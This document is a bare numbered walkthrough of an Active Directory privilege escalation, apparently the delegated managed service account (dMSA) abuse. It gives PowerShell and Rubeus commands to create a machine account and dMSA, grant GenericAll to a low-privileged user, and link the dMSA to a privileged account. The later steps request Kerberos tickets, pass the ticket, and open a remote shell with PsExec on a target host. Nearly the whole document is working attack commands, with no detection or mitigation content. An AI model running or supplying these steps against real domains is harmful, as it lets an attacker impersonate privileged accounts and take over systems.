### **1. Create a Computer Account**

```powershell
New-ADComputer -Name BadMachine1234 `
    -SamAccountName "BadMachine1234$" `
    -AccountPassword (ConvertTo-SecureString -String "Passw0rd@123456" -AsPlainText -Force) `
    -Enabled $true `
    -Path "OU=SomeOU,DC=example,DC=com" `
    -PassThru `
    -Server "example.com"
```

---

### **2. Derive AES256 Hash using Rubeus**

```powershell
Rubeus.exe hash /password:Passw0rd@123456 /user:BadMachine1234$ /domain:example.com
```

Look for output line like:

```plaintext
aes256_cts_hmac_sha1 : 11223344556677889900AABBCCDDEEFF00112233445566778899AABBCCDDEEFF
```

---

### **3. Create the dMSA Account**

```powershell
New-ADServiceAccount -Name BadDMSA1234 `
    -DNSHostName BadDMSA1234.example.com `
    -CreateDelegatedServiceAccount `
    -KerberosEncryptionType AES256 `
    -PrincipalsAllowedToRetrieveManagedPassword "BadMachine1234$" `
    -Path "OU=SomeOU,DC=example,DC=com"
```

---

### **4. Grant `GenericAll` to Low Privileged User**

```powershell
$sid = (Get-ADUser -Identity "lowuser").SID
$acl = Get-Acl "AD:\CN=BadDMSA1234,OU=SomeOU,DC=example,DC=com"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=BadDMSA1234,OU=SomeOU,DC=example,DC=com" -AclObject $acl
```

---

### **5. Set Delegation Attributes**

```powershell
Set-ADServiceAccount -Identity BadDMSA1234 -Replace @{
    'msDS-ManagedAccountPrecededByLink' = 'CN=Privilegeduser,DC=example,DC=com'
    'msDS-DelegatedMSAState' = 2
}
```

---

### **6. Check dMSA Attributes**

```powershell
Get-ADServiceAccount -Identity BadDMSA1234 -Properties msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState |
    Select-Object Name, msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState
```

---

### **7. Test Access (Pre-Impersonation)**

```powershell
dir \\TargetHost\c$
```

---

### **8. Request TGT with Machine Account**

```powershell
Rubeus.exe asktgt /user:BadMachine1234$ /aes256:11223344556677889900AABBCCDDEEFF00112233445566778899AABBCCDDEEFF /domain:example.com /nowrap
```

---

### **9. Extract Base64 TGT**

Manually extract from the above Rubeus output

---

### **10. Request TGS Using dMSA**

```powershell
Rubeus.exe asktgs /targetuser:BadDMSA1234$ /service:krbtgt/example.com /dmsa /opsec /ptt /nowrap  /ticket:<Base64TGT>
```

---

### **11. Test Access (Post-Impersonation)**

```powershell
dir \\TargetHost\c$
```

```powershell
psExec.exe \\TargetHost cmd
```

---
